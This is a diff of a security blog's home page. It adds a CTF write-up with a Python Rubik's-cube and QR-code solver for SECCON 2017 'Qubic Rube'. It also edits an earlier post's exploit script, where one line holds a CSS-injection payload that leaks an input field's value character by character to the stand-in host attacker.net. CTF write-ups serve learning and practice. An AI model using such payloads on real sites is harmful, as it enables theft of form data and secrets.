@@ -158,6 +158,486 @@
 
   <span class="post-date">
     
+    December
+    10th,
+    
+    2017
+  </span>
+
+  <h2>
+    <a href="/ctf/ppm/2017/12/10/ctf-writeup-seccon-2017-rubiks.html">CTF Write-up - SECCON 2017 Qubic Rube - Solving a Rubik's without force</a>
+  </h2>
+
+  <div>
+    
+    <p>Here’s the solution for a programming challenge I did during SECCON 2017.</p>
+
+<h3 id="introduction">Introduction</h3>
+
+<p><img src="/assets/media/qubic1.png" alt="" /></p>
+
+<p>The challenge is a programming challenge, we get greeted with a three.js cube with 6 textures, one for each faces with a QR-Code on them. Using <code class="highlighter-rouge">zbar</code> to read them, we will see this message:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>SECCON 2017 Online CTF                                   <span class="o">]</span>
+<span class="o">[</span>No. 1 / 50                                               <span class="o">]</span>
+<span class="o">[</span>Qubic Rube                                               <span class="o">]</span>
+<span class="o">[</span>Next URL is:                                             <span class="o">]</span>
+<span class="o">[</span>Have fun!                                                <span class="o">]</span>
+<span class="o">[</span>http://qubicrube.pwn.seccon.jp:33654/02c286df1bbd7923d1f7]</code></pre></figure>
+
+<p>Going to that page will redirect us to a page with another challenge:</p>
+
+<p><img src="/assets/media/qubic3.png" alt="" /></p>
+
+<p>Seems like we are going to code a rubiks solver.</p>
+
+<h3 id="idea">Idea</h3>
+<p>After seeing some other write-ups for this challenge, it seems like there’s a way to scramble the cube enough to give the solution with enough permutations. My solution is a little bit different in the fact that I am going to solve it using a rubiks solver rather than using a brute-forcy way.</p>
+
+<p>The different difficulties I encountered during the challenge development:
+	- The color opposites of the cubes weren’t always the same (generally white is supposed to be at the opposite of yellow, red &lt;&gt; orange and blue &lt;&gt; green), but it wasn’t always the case and I lost some time because of that.
+	- Sometimes the center of the cube wasn’t properly rotated, so I had to add a little bit more operations at the end of the script to try 3 other cube combinations and try to read a QR-code.</p>
+
+<h3 id="the-code">The code</h3>
+
+<ul>
+  <li>Download the images for the 6 faces (or use local versions)</li>
+  <li>Crop the images into 9 pieces</li>
+  <li>Read the center color for each faces</li>
+  <li>Send it to a rubiks solver, here I am using the python library “kociemba”.</li>
+  <li>Create the different essential moves R (right), L (left), U (up), D (down), F (front) and B (back).
+    <ul>
+      <li>I could’ve optimised a little bit the code here by creating inverse move but decided to just to the move 3 times when seeing a quote (Ex: <code class="highlighter-rouge">R'</code>) and 2 times when I encounter a 2 (Ex: <code class="highlighter-rouge">R2</code>).</li>
+    </ul>
+  </li>
+  <li>Parse the solver’s output and use the different moves created</li>
+  <li>Put the pieces back together</li>
+  <li>Launch zbar on each of them 4 times (rotating the center piece)</li>
+</ul>
+
+<noscript><pre>import kociemba
+from PIL import Image
+import requests
+import argparse
+import logging as log
+import zbar
+import sys
+import os
+import random
+from subprocess import *
+
+# last 504ded069e4db4e3bef9
+
+url = &quot;http://qubicrube.pwn.seccon.jp:33654/&quot;
+
+parser = argparse.ArgumentParser()
+parser.add_argument(&quot;prefix&quot;, help=&quot;the prefix to use, example 504ded069e4db4e3bef9&quot;)
+parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, help=&quot;increase output verbosity&quot;,
+	action=&quot;store_true&quot;)
+parser.add_argument(&quot;-d&quot;, &quot;--download&quot;, help=&quot;download the challenge&quot;,
+	action=&quot;store_true&quot;)
+
+args = parser.parse_args()
+prefix = str(args.prefix.split(&quot;/&quot;)[-1:][0])
+if args.verbose:
+	log.basicConfig(level=log.DEBUG, format=&quot;[+] %(message)s&quot;)
+else:
+	log.basicConfig(level=log.WARNING)
+
+log.info(&quot;Using prefix: &quot;+prefix)
+
+suffix = [&quot;_R&quot;, &quot;_L&quot;, &quot;_U&quot;, &quot;_B&quot;, &quot;_F&quot;, &quot;_D&quot;]
+
+extension = &quot;.png&quot;
+
+requests_queue = []
+
+if args.download:
+	for suf in suffix:
+		current_name = prefix + suf + extension
+		current_url = url + &quot;images/&quot; + current_name
+		logging.info(current_url)
+		r = requests.get(current_url)
+		path = current_name
+		if r.status_code == 200:
+			with open(path, &#39;w+&#39;) as f:
+				for chunk in r.iter_content(1024):
+					f.write(chunk)
+		logging.info(&quot;Getting &quot;+ prefix + suf)
+
+s = 82
+
+up = Image.open(prefix+&quot;_U.png&quot;)
+right = Image.open(prefix+&quot;_R.png&quot;)
+front = Image.open(prefix+&quot;_F.png&quot;)
+down = Image.open(prefix+&quot;_D.png&quot;)
+left = Image.open(prefix+&quot;_L.png&quot;)
+back = Image.open(prefix+&quot;_B.png&quot;)
+
+cube2 = []
+
+def cropImages(img):
+	for i in range (0, 9):
+		cube2.append(img.copy().crop(((i % 3) * s, ((i / 3) % 3) * s, ((i % 3) + 1) * s, (((i / 3) % 3) + 1) * s)))
+
+cropImages(up)
+cropImages(right)
+cropImages(front)
+cropImages(down)
+cropImages(left)
+cropImages(back)
+
+#URFDLB
+
+def getColorBasic(img):
+	x = 0
+	while (img.getpixel((x, 0)) == (0, 0, 0)):
+		x += 1
+	return img.getpixel((x, 0))
+
+U = getColorBasic(cube2[4])
+R = getColorBasic(cube2[13])
+F = getColorBasic(cube2[22])
+D = getColorBasic(cube2[31])
+L = getColorBasic(cube2[40])
+B = getColorBasic(cube2[49])
+# U = (255, 255, 255)
+# D = (0, 81, 186) # blue
+# R = (196, 30, 58) # red
+# B = (255, 213, 0) # yellow
+# F = (0, 158, 96) # green
+# L = (255, 88, 0) # orange
+
+def getColor(img):
+	x = 0
+	while (img.getpixel((x, 0)) == (0, 0, 0)):
+		x += 1
+	color = img.getpixel((x, 0))
+	if color == U:
+		return &quot;U&quot;
+	elif color == R:
+		return &quot;R&quot;
+	elif color == F:
+		return &quot;F&quot;
+	elif color == D:
+		return &quot;D&quot;
+	elif color == L:
+		return &quot;L&quot;
+	elif color == B:
+		return &quot;B&quot;
+	else:
+		logging.error(&quot;wtf color&quot;)
+		img.save(&quot;wtf.png&quot;)
+		sys.exit()
+
+solve = &quot;&quot;
+cube = &quot;&quot;
+for i in cube2:
+	cube += getColor(i)
+log.info(cube)
+solve = kociemba.solve(cube)
+
+log.info(solve)
+
+def regenerateCube():
+	global up
+	global right
+	global front
+	global down
+	global left
+	global back
+
+	up = Image.new(&quot;RGB&quot;, (s*3, s*3))
+	for i in range(0,9):
+		up.paste(cube2[i], ((i % 3) * s,((i / 3) % 3) * s))
+	up.save(&quot;up.png&quot;)
+
+	right = Image.new(&quot;RGB&quot;, (s*3, s*3))
+	for i in range(9,18):
+		right.paste(cube2[i], ((i % 3) * s,((i / 3) % 3) * s))
+	right.save(&quot;right.png&quot;)
+
+	front = Image.new(&quot;RGB&quot;, (s*3, s*3))
+	for i in range(18,27):
+		front.paste(cube2[i], ((i % 3) * s,((i / 3) % 3) * s))
+	front.save(&quot;front.png&quot;)
+
+	down = Image.new(&quot;RGB&quot;, (s*3, s*3))
+	for i in range(27,36):
+		down.paste(cube2[i], ((i % 3) * s,((i / 3) % 3) * s))
+	down.save(&quot;down.png&quot;)
+
+	left = Image.new(&quot;RGB&quot;, (s*3, s*3))
+	for i in range(36,45):
+		left.paste(cube2[i], ((i % 3) * s,((i / 3) % 3) * s))
+	left.save(&quot;left.png&quot;)
+
+	back = Image.new(&quot;RGB&quot;, (s*3, s*3))
+	for i in range(45,54):
+		back.paste(cube2[i], ((i % 3) * s,((i / 3) % 3) * s))
+	back.save(&quot;back.png&quot;)
+
+
+#           00-01-02
+#           03-04-05
+#           06-07-08
+#36-37-38   18-19-20      09-10-11    45-46-47
+#39-40-41   21-22-23      12-13-14    48-49-50
+#42-43-44   24-25-26      15-16-17    51-52-53
+#           27-28-29
+#           30-31-32
+#           33-34-35
+
+def moveR():
+	log.info(&quot;Moving right&quot;)
+	copy = []
+	copy.append(cube2[2])
+	copy.append(cube2[5])
+	copy.append(cube2[8])
+	cube2[2] = cube2[20]
+	cube2[5] = cube2[23]
+	cube2[8] = cube2[26]
+	cube2[20] = cube2[29]
+	cube2[23] = cube2[32]
+	cube2[26] = cube2[35]
+	cube2[29] = cube2[51].rotate(180)
+	cube2[32] = cube2[48].rotate(180)
+	cube2[35] = cube2[45].rotate(180)
+	cube2[51] = copy[0].rotate(180)
+	cube2[48] = copy[1].rotate(180)
+	cube2[45] = copy[2].rotate(180)
+	i = right.rotate(270)
+	cube2[9] = i.crop((0, 0, s, s))
+	cube2[10] = i.crop((s, 0, s*2, s))
+	cube2[11] = i.crop((s*2, 0, s*3, s))
+	cube2[12] = i.crop((0, s, s, s*2))
+	cube2[13] = i.crop((s, s, s*2, s*2))
+	cube2[14] = i.crop((s*2, s, s*3, s*2))
+	cube2[15] = i.crop((0, s*2, s, s*3))
+	cube2[16] = i.crop((s, s*2, s*2, s*3))
+	cube2[17] = i.crop((s*2, s*2, s*3, s*3))
+
+
+def moveD():
+	log.info(&quot;Moving down&quot;)
+	copy = []
+	copy.append(cube2[24])
+	copy.append(cube2[25])
+	copy.append(cube2[26])
+	cube2[24] = cube2[42]
+	cube2[25] = cube2[43]
+	cube2[26] = cube2[44]
+	cube2[42] = cube2[51]
+	cube2[43] = cube2[52]
+	cube2[44] = cube2[53]
+	cube2[51] = cube2[15]
+	cube2[52] = cube2[16]
+	cube2[53] = cube2[17]
+	cube2[15] = copy[0]
+	cube2[16] = copy[1]
+	cube2[17] = copy[2]
+	i = down.rotate(270)
+	cube2[27] = i.crop((0, 0, s, s))
+	cube2[28] = i.crop((s, 0, s*2, s))
+	cube2[29] = i.crop((s*2, 0, s*3, s))
+	cube2[30] = i.crop((0, s, s, s*2))
+	cube2[31] = i.crop((s, s, s*2, s*2))
+	cube2[32] = i.crop((s*2, s, s*3, s*2))
+	cube2[33] = i.crop((0, s*2, s, s*3))
+	cube2[34] = i.crop((s, s*2, s*2, s*3))
+	cube2[35] = i.crop((s*2, s*2, s*3, s*3))
+
+def moveL():
+	log.info(&quot;Moving left&quot;)
+	copy = []
+	copy.append(cube2[27])
+	copy.append(cube2[30])
+	copy.append(cube2[33])
+	cube2[27] = cube2[18]
+	cube2[30] = cube2[21]
+	cube2[33] = cube2[24]
+	cube2[18] = cube2[0]
+	cube2[21] = cube2[3]
+	cube2[24] = cube2[6]
+	cube2[0] = cube2[53].rotate(180)
+	cube2[3] = cube2[50].rotate(180)
+	cube2[6] = cube2[47].rotate(180)
+	cube2[53] = copy[0].rotate(180)
+	cube2[50] = copy[1].rotate(180)
+	cube2[47] = copy[2].rotate(180)
+	i = left.rotate(270)
+	cube2[36] = i.crop((0, 0, s, s))
+	cube2[37] = i.crop((s, 0, s*2, s))
+	cube2[38] = i.crop((s*2, 0, s*3, s))
+	cube2[39] = i.crop((0, s, s, s*2))
+	cube2[40] = i.crop((s, s, s*2, s*2))
+	cube2[41] = i.crop((s*2, s, s*3, s*2))
+	cube2[42] = i.crop((0, s*2, s, s*3))
+	cube2[43] = i.crop((s, s*2, s*2, s*3))
+	cube2[44] = i.crop((s*2, s*2, s*3, s*3))
+
+def moveU():
+	log.info(&quot;Moving up&quot;)
+	copy = []
+	copy.append(cube2[18])
+	copy.append(cube2[19])
+	copy.append(cube2[20])
+	cube2[18] = cube2[9]
+	cube2[19] = cube2[10]
+	cube2[20] = cube2[11]
+	cube2[9] = cube2[45]
+	cube2[10] = cube2[46]
+	cube2[11] = cube2[47]
+	cube2[45] = cube2[36]
+	cube2[46] = cube2[37]
+	cube2[47] = cube2[38]
+	cube2[36] = copy[0]
+	cube2[37] = copy[1]
+	cube2[38] = copy[2]
+	i = up.rotate(270)
+	cube2[0] = i.crop((0, 0, s, s))
+	cube2[1] = i.crop((s, 0, s*2, s))
+	cube2[2] = i.crop((s*2, 0, s*3, s))
+	cube2[3] = i.crop((0, s, s, s*2))
+	cube2[4] = i.crop((s, s, s*2, s*2))
+	cube2[5] = i.crop((s*2, s, s*3, s*2))
+	cube2[6] = i.crop((0, s*2, s, s*3))
+	cube2[7] = i.crop((s, s*2, s*2, s*3))
+	cube2[8] = i.crop((s*2, s*2, s*3, s*3))
+
+def moveF():
+	log.info(&quot;Moving front&quot;)
+	copy = []
+	copy.append(cube2[15])
+	copy.append(cube2[12])
+	copy.append(cube2[9])
+	cube2[15] = cube2[8].rotate(270)
+	cube2[12] = cube2[7].rotate(270)
+	cube2[9] = cube2[6].rotate(270)
+	cube2[8] = cube2[38].rotate(270)
+	cube2[7] = cube2[41].rotate(270)
+	cube2[6] = cube2[44].rotate(270)
+	cube2[38] = cube2[27].rotate(270)
+	cube2[41] = cube2[28].rotate(270)
+	cube2[44] = cube2[29].rotate(270)
+	cube2[27] = copy[0].rotate(270)
+	cube2[28] = copy[1].rotate(270)
+	cube2[29] = copy[2].rotate(270)
+	i = front.rotate(270)
+	cube2[18] = i.crop((0, 0, s, s))
+	cube2[19] = i.crop((s, 0, s*2, s))
+	cube2[20] = i.crop((s*2, 0, s*3, s))
+	cube2[21] = i.crop((0, s, s, s*2))
+	cube2[22] = i.crop((s, s, s*2, s*2))
+	cube2[23] = i.crop((s*2, s, s*3, s*2))
+	cube2[24] = i.crop((0, s*2, s, s*3))
+	cube2[25] = i.crop((s, s*2, s*2, s*3))
+	cube2[26] = i.crop((s*2, s*2, s*3, s*3))
+
+def moveB():
+	log.info(&quot;Moving back&quot;)
+	copy = []
+	copy.append(cube2[0])
+	copy.append(cube2[1])
+	copy.append(cube2[2])
+	cube2[0] = cube2[11].rotate(90)
+	cube2[1] = cube2[14].rotate(90)
+	cube2[2] = cube2[17].rotate(90)
+	cube2[11] = cube2[35].rotate(90)
+	cube2[14] = cube2[34].rotate(90)
+	cube2[17] = cube2[33].rotate(90)
+	cube2[35] = cube2[42].rotate(90)
+	cube2[34] = cube2[39].rotate(90)
+	cube2[33] = cube2[36].rotate(90)
+	cube2[42] = copy[0].rotate(90)
+	cube2[39] = copy[1].rotate(90)
+	cube2[36] = copy[2].rotate(90)
+	i = back.rotate(270)
+	cube2[45] = i.crop((0, 0, s, s))
+	cube2[46] = i.crop((s, 0, s*2, s))
+	cube2[47] = i.crop((s*2, 0, s*3, s))
+	cube2[48] = i.crop((0, s, s, s*2))
+	cube2[49] = i.crop((s, s, s*2, s*2))
+	cube2[50] = i.crop((s*2, s, s*3, s*2))
+	cube2[51] = i.crop((0, s*2, s, s*3))
+	cube2[52] = i.crop((s, s*2, s*2, s*3))
+	cube2[53] = i.crop((s*2, s*2, s*3, s*3))
+
+def checkStatus():
+	global cube
+	cube = &quot;&quot;
+	for i in cube2:
+		cube += getColor(i)
+	log.info(cube)
+	log.info(kociemba.solve(cube))
+
+def parseSolve(solve):
+	for i in solve.split(&quot; &quot;):
+		if i[-1:] == &quot;&#39;&quot;:
+			eval(&quot;move&quot;+i[0:1]+&quot;()&quot;)
+			regenerateCube()
+			eval(&quot;move&quot;+i[0:1]+&quot;()&quot;)
+			regenerateCube()
+			eval(&quot;move&quot;+i[0:1]+&quot;()&quot;)
+		elif i[-1:] == &quot;2&quot;:
+			eval(&quot;move&quot;+i[0:1]+&quot;()&quot;)
+			regenerateCube()
+			eval(&quot;move&quot;+i[0:1]+&quot;()&quot;)
+		else:
+			eval(&quot;move&quot;+i[0:1]+&quot;()&quot;)
+		regenerateCube()
+		checkStatus()
+
+parseSolve(solve)
+
+scanner = zbar.ImageScanner()
+scanner.parse_config(&#39;enable&#39;)
+
+def decodeImage(img):
+	image = zbar.Image(s*3, s*3, &#39;Y800&#39;, img.copy().convert(&#39;L&#39;).tostring())
+	scanner.scan(image)
+	for symbol in image:
+		print &quot;Found: [%s]&quot; % symbol.data
+	del(image)
+
+def zbard():
+	decodeImage(up)
+	decodeImage(front)
+	decodeImage(down)
+	decodeImage(left)
+	decodeImage(right)
+	decodeImage(back)
+
+def rotateCenter():
+	cube2[4] = cube2[4].rotate(90)
+	cube2[13] = cube2[13].rotate(90)
+	cube2[22] = cube2[22].rotate(90)
+	cube2[31] = cube2[31].rotate(90)
+	cube2[40] = cube2[40].rotate(90)
+	cube2[49] = cube2[49].rotate(90)
+
+
+log.info(&quot;Solved&quot;)
+zbard()
+
+for i in range(3):
+	rotateCenter()
+	regenerateCube()
+	zbard()
+</pre></noscript>
+<script src="https://gist.github.com/rioru/5f2c9246e06bb2040acce89c0ac20a07.js"> </script>
+
+
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
     August
     27th,
     
@@ -223,7 +703,7 @@ def edit(s, cookie, bla):
 s = Session()
 
 cookie = {&quot;PHPSESSID&quot;: &quot;85gdkck3eegdmu215o02ac8rq0&quot;}
-bla = &#39;&#39;&#39;[color=&quot;test;} input[value^=&quot;&#39;&#39;&#39;+sys.argv[1]+&#39;&#39;&#39;&quot; i]{border-image: url(&#39;http://rioru.net/?a=&#39;&#39;&#39;+ sys.argv[1]+&#39;&#39;&#39;&quot;]a[/color]&#39;&#39;&#39;
+bla = &#39;&#39;&#39;[color=&quot;test;} input[value^=&quot;&#39;&#39;&#39;+sys.argv[1]+&#39;&#39;&#39;&quot; i]{border-image: url(&#39;http://attacker.net/?a=&#39;&#39;&#39;+ sys.argv[1]+&#39;&#39;&#39;&quot;]a[/color]&#39;&#39;&#39;
 log.info(&quot;Sending [%s, %s]&quot; % (i, bla))
 edit(s, cookie, bla)
 edit(s, cookie, bla)
